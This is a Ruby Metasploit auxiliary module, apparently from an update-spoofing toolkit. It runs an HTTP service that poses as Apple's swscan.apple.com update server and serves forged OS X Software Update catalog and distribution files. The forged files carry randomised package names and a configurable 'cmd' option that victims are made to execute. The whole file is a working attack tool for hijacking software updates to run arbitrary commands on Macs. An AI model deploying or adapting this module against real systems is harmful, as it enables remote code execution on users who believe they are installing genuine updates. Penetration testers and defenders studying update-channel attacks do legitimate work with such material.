require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake Apple OS X Software Updater',
			'Version'     => '1.0',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Apple OS X Software updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
			], self.class)

		@base = {
			'vh' => ['swscan.apple.com'],
			'request' => [{
				'req' => '\.sucatalog$', 
				'type' => 'file', 
				'method' => '', 
				'bin'    => '',
				'string' => '',
				'parse' => 1,
				'file' => 'osx_catalog.xml'
			},
			{
				'req' => '\.dist$', 
				'type' => 'file', 
				'method' => '', 
				'bin'    => '',		    
				'string' => '',
				'parse' => 1,
				'file' => 'osx_agent.xml'
			}
			],
			'options' => {  
				'pkey'  => { 
					'val' => '"#{RndNum(3)}-#{RndNum(4)}"',
					'hidden' => 1,
					'dynamic' =>1
				},			    	  
				'fname'  => { 
					'val' => 'RndAlpha(10)',
					'hidden' => 1,
					'dynamic' =>1
				},
				'update'  => { 
					'val' => 'RndAlpha(10)',
					'hidden' => 1,
					'dynamic' =>1
				},			    	  
				'cmd'  => { 
					'val' => '/bin/ls',
					'desc' => 'command to execute'
				}
			}
		}
	end
end
